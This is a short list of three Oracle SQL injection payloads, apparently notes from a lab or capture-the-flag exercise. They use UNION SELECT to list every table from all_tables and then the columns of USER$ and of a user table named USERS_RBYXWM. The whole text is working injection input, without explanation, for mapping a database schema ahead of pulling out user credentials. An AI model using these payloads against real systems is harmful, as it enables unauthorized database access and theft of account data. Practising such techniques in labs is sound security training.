' union SELECT table_name,null FROM all_tables--

' union SELECT column_name,null FROM all_tab_columns WHERE table_name = 'USER$'--

' union SELECT column_name,null FROM all_tab_columns WHERE table_name = 'USERS_RBYXWM'--

